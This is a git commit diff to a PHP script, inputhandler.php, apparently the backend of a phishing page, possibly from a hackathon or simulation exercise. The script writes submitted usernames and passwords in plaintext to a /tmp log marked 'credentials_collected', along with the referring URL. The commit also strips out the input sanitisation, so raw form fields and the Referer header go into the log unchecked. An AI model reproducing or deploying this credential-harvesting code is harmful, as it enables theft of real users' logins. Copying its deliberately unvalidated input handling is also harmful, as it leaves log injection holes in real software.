5a15cecbf04f7b9b0521418f7e42e9fd0f3f269e
hackathon1023 <144865612+hackathon1023@users.noreply.github.com>
2023-10-04 06:29:27 -0500

    Update inputhandler.php

--- inputhandler.php
+++ inputhandler.php
@@ -1,17 +1,11 @@
 <?php
 $myfile = fopen("/tmp/urlinput.log", "a", true) or die("Unable to open file!");
-$user = input_validation($_POST["user"]);
-$password = input_validation($_POST["password"]);
-$urlpath = input_validation($_POST["urlpath"]);
+$user = $_POST["user"];
+$password = $_POST["password"];
+$urlpath = $_SERVER["HTTP_REFERER"];
 $timestamp = date('m/d/Y H:i:s');
 $logentry = '{"timestamp":"'.$timestamp.'","action":"credentials_collected","user":"'.$user.'","password":"'.$password.'","urlpath":"'.$urlpath.'"}';
 fwrite($myfile, $logentry);
 fwrite($myfile, "\r\n");
 fclose($myfile);
-function input_validation($data) {
-        $data = trim($data);
-        $data = stripslashes($data);
-        $data = htmlspecialchars($data);
-        return $data;
-}
 ?>
